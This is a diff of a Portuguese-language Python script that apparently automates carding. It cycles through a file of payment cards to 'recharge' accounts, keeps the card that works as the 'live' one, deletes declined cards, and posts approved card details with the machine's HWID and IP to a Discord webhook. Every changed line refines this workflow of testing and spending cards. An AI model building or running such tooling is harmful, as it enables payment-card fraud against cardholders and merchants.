+        if not lista_cartoes or len(lista_cartoes) == 0:
+            print(f"{Fore.RED}❌ Não existem mais cartões para recarregar as contas{Style.RESET_ALL}")
+            return
+
+        # Começa pelo cartão "live" atual, depois tenta os demais
+        ordem_indices = list(range(indice_cartao_live, len(lista_cartoes))) + list(range(0, indice_cartao_live))
+        indices_para_remover = []
+        for idx in ordem_indices:
+            dados_cartao = lista_cartoes[idx]
+            print(f"{Fore.BLUE}💳 Tentando com cartão ****{dados_cartao['numero'][-4:]} (#{idx+1}){Style.RESET_ALL}")
+
             # Obter token do cartão
             print(f"{Fore.BLUE}Obtendo token do cartão...{Style.RESET_ALL}")
             token_cartao_data = obter_token_cartao(token_jwt, codigo_cliente, dados_cartao['numero'])
             if not token_cartao_data or not token_cartao_data.get('token'):
                 print(f"{Fore.RED}❌ Falha ao obter token do cartão{Style.RESET_ALL}")
-                falhas_total += 1
+                indices_para_remover.append(idx)
                 continue
-            
+
             print(f"{Fore.GREEN}✅ Token do cartão obtido!{Style.RESET_ALL}")
-            
-            # Criar pedido
-            print(f"{Fore.BLUE}Criando pedido...{Style.RESET_ALL}")
-            pedido_data = criar_pedido(token_jwt, codigo_cliente)
-            if not pedido_data:
-                print(f"{Fore.RED}❌ Falha ao criar pedido{Style.RESET_ALL}")
-                falhas_total += 1
-                continue
-            
-            print(f"{Fore.GREEN}✅ Pedido criado com sucesso!{Style.RESET_ALL}")
-            
-            # Processar pagamento com sistema escalonado
-            order_id = pedido_data.get('numero')
-            if order_id:
-                print(f"{Fore.CYAN}Processando pagamento com sistema escalonado...{Style.RESET_ALL}")
-                
-                # Preparar dados do cartão para pagamento
-                card_data = {
-                    "cardholder_name": conta['nome'],
-                    "security_code": dados_cartao['cvv'],
-                    "brand": "Elo",  # Pode ser ajustado conforme necessário
-                    "expiration_month": dados_cartao['mes'].zfill(2),
-                    "expiration_year": dados_cartao['ano']
-                }
-                
-                customer_data = {
-                    'codigo': codigo_cliente,
-                    'nome': conta['nome'],
-                    'email': "naoachanuncatropadossocios@tuamaeaquelaursa.com",
-                    'cpf': conta['cpf'],
-                    'telefone': "13988238323"
-                }
-                
-                # Tentar pagamento escalonado
-                sucesso, valor_aprovado = tentar_pagamento_escalonado(
-                    token_jwt, 
-                    codigo_cliente, 
-                    token_cartao_data.get('token'),
-                    customer_data,
-                    card_data,
-                    dados_cartao,
-                    conta
-                )
-                
-                if sucesso:
-                    print(f"{Fore.GREEN}✅ Recarga processada com sucesso com R$ {valor_aprovado:.2f}!{Style.RESET_ALL}")
-                    sucessos_total += 1
-                    sucessos_cartao += 1
-                    # CARTÃO APROVADO: Continua com próxima conta usando o mesmo cartão
-                else:
-                    print(f"{Fore.RED}❌ Recarga falhou - cartão falhou nos 3 valores{Style.RESET_ALL}")
-                    falhas_total += 1
-                    # CARTÃO FALHOU NOS 3 VALORES: Pula para próximo cartão
-                    print(f"{Fore.YELLOW}🔄 Pulando para próximo cartão...{Style.RESET_ALL}")
-                    break  # Sai do loop de contas e vai para próximo cartão
+
+            # Processamento com sistema escalonado (criação de pedidos ocorre dentro da função)
+            print(f"{Fore.CYAN}Processando pagamento com sistema escalonado...{Style.RESET_ALL}")
+            # Preparar dados do cartão para pagamento
+            card_data = {
+                "cardholder_name": conta['nome'],
+                "security_code": dados_cartao['cvv'],
+                "brand": "Elo",
+                "expiration_month": dados_cartao['mes'].zfill(2),
+                "expiration_year": dados_cartao['ano']
+            }
+
+            customer_data = {
+                'codigo': codigo_cliente,
+                'nome': conta['nome'],
+                'email': conta.get('email', ""),
+                'cpf': conta['cpf'],
+                'telefone': conta.get('telefone', "")
+            }
+
+            sucesso, valor_aprovado = tentar_pagamento_escalonado(
+                token_jwt,
+                codigo_cliente,
+                token_cartao_data.get('token'),
+                customer_data,
+                card_data,
+                dados_cartao,
+                conta
+            )
+
+            if sucesso:
+                print(f"{Fore.GREEN}✅ Recarga processada com sucesso com R$ {valor_aprovado:.2f}!{Style.RESET_ALL}")
+                salvar_conta_recarregada(conta, valor_aprovado)
+                remover_conta_de_contas(conta)
+                enviar_webhook_recarga_aprovada(DISCORD_WEBHOOK_URL, dados_cartao, conta, valor_aprovado, hwid, ip_publico)
+                sucessos += 1
+                aprovado_com_algum_cartao = True
+                # Mantém este cartão como "live" para próxima conta
+                indice_cartao_live = idx
+                break
             else:
-                print(f"{Fore.RED}❌ ID do pedido não encontrado{Style.RESET_ALL}")
-                falhas_total += 1
-            
-            # Aguardar entre processamentos
-            print(f"{Fore.BLUE}Aguardando 2 segundos...{Style.RESET_ALL}")
-            time.sleep(2)
+                print(f"{Fore.RED}❌ Recarga falhou com este cartão, marcando para remoção...{Style.RESET_ALL}")
+                indices_para_remover.append(idx)
+                # Continua tentando próximo cartão
+                continue
+
+        # Remover cartões que falharam nesta conta do arquivo e da lista
+        if indices_para_remover:
+            # Remover do arquivo pagamento.txt
+            for idx in sorted(set(indices_para_remover), reverse=True):
+                if 0 <= idx < len(lista_cartoes):
+                    remover_cartao_de_pagamento(lista_cartoes[idx])
+            # Recarregar lista de cartões do arquivo após remoções
+            lista_cartoes = ler_lista_cartoes()
+            # Ajustar índice "live" se necessário
+            if lista_cartoes:
+                indice_cartao_live = min(indice_cartao_live, len(lista_cartoes) - 1)
+            else:
+                print(f"{Fore.RED}❌ Não existem mais cartões para recarregar as contas{Style.RESET_ALL}")
+                return
+
+        if not aprovado_com_algum_cartao:
+            print(f"{Fore.RED}❌ Recarga falhou com todos os cartões para esta conta{Style.RESET_ALL}")
+            falhas += 1
         
-        # Resumo do cartão atual
-        print(f"\n{Fore.CYAN}--- RESUMO CARTÃO ****{dados_cartao['numero'][-4:]} ---{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✅ Sucessos com este cartão: {sucessos_cartao}{Style.RESET_ALL}")
-        
-        # Se não houve sucessos com este cartão, ele já foi removido pela função tentar_pagamento_escalonado
-        if sucessos_cartao == 0:
-            print(f"{Fore.RED}🗑️ Cartão removido do arquivo pagamento.txt{Style.RESET_ALL}")
+        # Aguardar entre processamentos
+        print(f"{Fore.BLUE}Aguardando 2 segundos...{Style.RESET_ALL}")
     
     # Resumo final
-    print(f"\n{Fore.CYAN}=== RESUMO FINAL DA RECARGA ==={Style.RESET_ALL}")
-    print(f"{Fore.GREEN}✅ Total de sucessos: {sucessos_total}{Style.RESET_ALL}")
-    print(f"{Fore.RED}❌ Total de falhas: {falhas_total}{Style.RESET_ALL}")
-    print(f"{Fore.BLUE}📊 Total de contas processadas: {len(contas)}{Style.RESET_ALL}")
-    print(f"{Fore.BLUE}💳 Total de cartões processados: {len(todos_cartoes)}{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}=== RESUMO DA RECARGA ==={Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ Sucessos: {sucessos}{Style.RESET_ALL}")
+    print(f"{Fore.RED}❌ Falhas: {falhas}{Style.RESET_ALL}")
+    print(f"{Fore.BLUE}📊 Total processado: {len(contas)}{Style.RESET_ALL}")
 
 def mostrar_menu():
     """
